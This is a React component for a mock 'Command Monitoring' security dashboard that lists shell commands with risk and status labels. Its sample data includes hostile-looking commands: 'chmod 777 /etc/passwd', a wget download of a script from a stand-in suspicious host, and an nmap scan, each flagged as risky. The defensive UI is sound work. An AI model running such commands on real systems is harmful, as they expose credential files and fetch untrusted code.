import {
  Terminal,
  Search,
  AlertTriangle,
  ShieldCheck,
} from "lucide-react";

const commands = [
  {
    id: 1,
    command: "sudo nmap -sS 192.168.1.0/24",
    source: "192.168.1.15",
    user: "admin",
    status: "Suspicious",
    risk: "High",
    time: "2 min ago",
  },
  {
    id: 2,
    command: "ls -la /var/log",
    source: "192.168.1.10",
    user: "admin",
    status: "Safe",
    risk: "Low",
    time: "6 min ago",
  },
  {
    id: 3,
    command: "chmod 777 /etc/passwd",
    source: "192.168.1.23",
    user: "unknown",
    status: "Blocked",
    risk: "Critical",
    time: "12 min ago",
  },
  {
    id: 4,
    command: "netstat -ano",
    source: "192.168.1.30",
    user: "admin",
    status: "Safe",
    risk: "Low",
    time: "18 min ago",
  },
  {
    id: 5,
    command: "wget http://suspicious-site.com/file.sh",
    source: "192.168.1.45",
    user: "unknown",
    status: "Suspicious",
    risk: "High",
    time: "25 min ago",
  },
];

function getRiskStyle(risk) {
  if (risk === "Critical") {
    return "border-red-500/20 bg-red-500/10 text-red-400";
  }

  if (risk === "High") {
    return "border-orange-500/20 bg-orange-500/10 text-orange-400";
  }

  return "border-green-500/20 bg-green-500/10 text-green-400";
}

function getStatusStyle(status) {
  if (status === "Blocked") {
    return "bg-red-500/10 text-red-400";
  }

  if (status === "Suspicious") {
    return "bg-yellow-500/10 text-yellow-400";
  }

  return "bg-green-500/10 text-green-400";
}

function Commands() {
  return (
    <div className="space-y-6">

      {/* Header */}
      <div>
        <h1 className="text-2xl font-bold text-white">
          Command Monitoring
        </h1>

        <p className="mt-1 text-sm text-slate-400">
          Monitor system commands and detect suspicious activity.
        </p>
      </div>

      {/* Statistics */}
      <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">

        <div className="rounded-xl border border-slate-800 bg-slate-900 p-5">
          <div className="flex items-center gap-4">

            <div className="rounded-lg bg-blue-500/10 p-3">
              <Terminal className="text-blue-400" size={22} />
            </div>

            <div>
              <p className="text-sm text-slate-400">
                Total Commands
              </p>

              <p className="text-2xl font-bold text-white">
                1,284
              </p>
            </div>

          </div>
        </div>

        <div className="rounded-xl border border-slate-800 bg-slate-900 p-5">
          <div className="flex items-center gap-4">

            <div className="rounded-lg bg-yellow-500/10 p-3">
              <AlertTriangle
                className="text-yellow-400"
                size={22}
              />
            </div>

            <div>
              <p className="text-sm text-slate-400">
                Suspicious
              </p>

              <p className="text-2xl font-bold text-white">
                23
              </p>
            </div>

          </div>
        </div>

        <div className="rounded-xl border border-slate-800 bg-slate-900 p-5">
          <div className="flex items-center gap-4">

            <div className="rounded-lg bg-red-500/10 p-3">
              <AlertTriangle
                className="text-red-400"
                size={22}
              />
            </div>

            <div>
              <p className="text-sm text-slate-400">
                Blocked
              </p>

              <p className="text-2xl font-bold text-white">
                08
              </p>
            </div>

          </div>
        </div>

        <div className="rounded-xl border border-slate-800 bg-slate-900 p-5">
          <div className="flex items-center gap-4">

            <div className="rounded-lg bg-green-500/10 p-3">
              <ShieldCheck
                className="text-green-400"
                size={22}
              />
            </div>

            <div>
              <p className="text-sm text-slate-400">
                Safe
              </p>

              <p className="text-2xl font-bold text-white">
                1,253
              </p>
            </div>

          </div>
        </div>

      </div>

      {/* Search */}
      <div className="rounded-xl border border-slate-800 bg-slate-900 p-4">

        <div className="flex items-center gap-3 rounded-lg border border-slate-700 bg-slate-950 px-4 py-3">

          <Search
            size={18}
            className="text-slate-500"
          />

          <input
            type="text"
            placeholder="Search commands, IP addresses, or users..."
            className="w-full bg-transparent text-sm text-white outline-none placeholder:text-slate-600"
          />

        </div>

      </div>

      {/* Commands Table */}
      <div className="overflow-hidden rounded-xl border border-slate-800 bg-slate-900">

        <div className="border-b border-slate-800 p-5">

          <h2 className="text-lg font-semibold text-white">
            Recent Commands
          </h2>

          <p className="mt-1 text-sm text-slate-400">
            Commands detected across monitored systems.
          </p>

        </div>

        <div className="overflow-x-auto">

          <table className="w-full text-left">

            <thead className="border-b border-slate-800 bg-slate-950">

              <tr className="text-xs uppercase text-slate-500">

                <th className="px-6 py-4">
                  Command
                </th>

                <th className="px-6 py-4">
                  Source
                </th>

                <th className="px-6 py-4">
                  User
                </th>

                <th className="px-6 py-4">
                  Status
                </th>

                <th className="px-6 py-4">
                  Risk
                </th>

                <th className="px-6 py-4">
                  Time
                </th>

              </tr>

            </thead>

            <tbody className="divide-y divide-slate-800">

              {commands.map((item) => (

                <tr
                  key={item.id}
                  className="transition hover:bg-slate-800/40"
                >

                  {/* Command */}
                  <td className="px-6 py-5">

                    <code className="rounded-md bg-slate-950 px-3 py-2 text-sm text-blue-300">
                      {item.command}
                    </code>

                  </td>

                  {/* Source */}
                  <td className="px-6 py-5 font-mono text-sm text-slate-300">
                    {item.source}
                  </td>

                  {/* User */}
                  <td className="px-6 py-5 text-sm text-slate-300">
                    {item.user}
                  </td>

                  {/* Status */}
                  <td className="px-6 py-5">

                    <span
                      className={`rounded-full px-3 py-1 text-xs font-medium ${getStatusStyle(
                        item.status
                      )}`}
                    >
                      {item.status}
                    </span>

                  </td>

                  {/* Risk */}
                  <td className="px-6 py-5">

                    <span
                      className={`rounded-full border px-3 py-1 text-xs font-medium ${getRiskStyle(
                        item.risk
                      )}`}
                    >
                      {item.risk}
                    </span>

                  </td>

                  {/* Time */}
                  <td className="px-6 py-5 text-sm text-slate-500">
                    {item.time}
                  </td>

                </tr>

              ))}

            </tbody>

          </table>

        </div>

      </div>

    </div>
  );
}

export default Commands;